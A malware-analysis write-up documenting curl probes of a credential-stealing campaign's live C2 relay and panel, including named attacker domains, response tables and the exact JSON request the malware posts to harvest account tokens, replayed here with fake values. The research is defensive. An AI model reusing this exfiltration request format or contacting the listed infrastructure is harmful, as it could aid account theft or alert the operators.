# Probing the C2 endpoints

After the static work I wanted to know whether these endpoints are actually live and how they
answer, so I replayed the same requests the malware makes, with data that is obviously fake.
All of it is HTTP from a normal `curl`, nothing was executed.

Date: 2026-11-13, around 22:20 UTC. Base: `https://relay-3f9c71.kartohaantoha36-6a9.workers.dev`,
which is what the TON contract currently hands out. `funrat.mom` fronts the same backend.

## Read-only probes

| request | response | what it tells you |
|---|---|---|
| `GET /config` | `200`, slot map, `"v":47` | live, same config the payloads read |
| `GET /report` | `405` Spring Boot error, `"path":"/api/report"` | route exists, wants POST, backend is Spring Boot |
| `GET /error` | `200 {"ok":false,"err":"empty"}` | route exists and parses the request |
| `GET /api/premium-status?id=00000000-...` | `200 {"premium":false}` | open, no auth, answers any id |
| `GET /api/premium-status?id=30e3267e-d80c-4a8f-84e2-bb475930a37c` | `200 {"premium":false}` | the campaign key hardcoded in the loader is **not** premium server side |
| `GET /api/ingest`, `/version`, `/update` | `302 -> https://funrat.mom/auth/login` | these are panel routes behind a login, the operator UI is real |
| `GET https://funrat.co/...` | NXDOMAIN | the upload base used by `back.jar` is not registered right now |
| `GET https://telemetry-relay.kartohaantoha36-6a9.workers.dev/...` | `403` / `530` Cloudflare | that worker is not deployed or has no origin |

## Sending fake data

The exact shape `aurora.rattle` posts, with zeros instead of a real account:

```
POST /report
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/120.0.0.0 Safari/537.36

{"name":"probe-test","uuid":"00000000-0000-4000-8000-000000000000",
 "token":"000000000000000","receiver":"0","key":"00000000-0000-4000-8000-000000000000"}
```

```
200 {"ok":true,"relayed":true,"code":200,"w":"relayed"}
```

So the credential collection endpoint is live and forwards the payload onward. It does not
validate anything:

```
POST /report   {}        -> 200 {"ok":true,"relayed":true,"code":200,"w":"relayed"}
POST /report   hello     -> 200 {"ok":true,"relayed":true,"code":200,"w":"relayed"}
```

The crash beacon also accepts writes:

```
POST /error  {"src":"probe","msg":"static analysis probe, not a victim","uuid":"0000..."}
200 {"ok":true,"sent":false,"code":0}
```

`sent:false` means it took the request but did not forward it, probably because `src` has to be
one of the values the malware uses.

## The part I did not expect

The worker is a catch-all. A path that does not exist still returns 200:

```
POST /nope-404-test   {}   -> 200 {"ok":true,"ignored":true}
```

That explains why the implant never seems to complain about its beacons. Anything it posts is
either relayed or silently swallowed, so a broken or seized C2 looks identical to a working one
from the victim's side. It also means you cannot learn anything from a status code alone, which
is why the `405` on `/report` was more useful than a `200` on a made up path.

## What this costs

Every request above came from a normal residential IP and is in their logs, and Cloudflare sees
it too. Two junk rows are now in their panel. That is a small price for confirming the endpoint
harvests accounts, but it is not free: the operator can see the pattern, and if they notice they
will rotate the relay, which is exactly the thing that makes this campaign annoying to track.

If you repeat this, do it from a throwaway exit, keep it to a couple of requests, and keep the
fake values obviously fake so they never look like a real victim in their database.
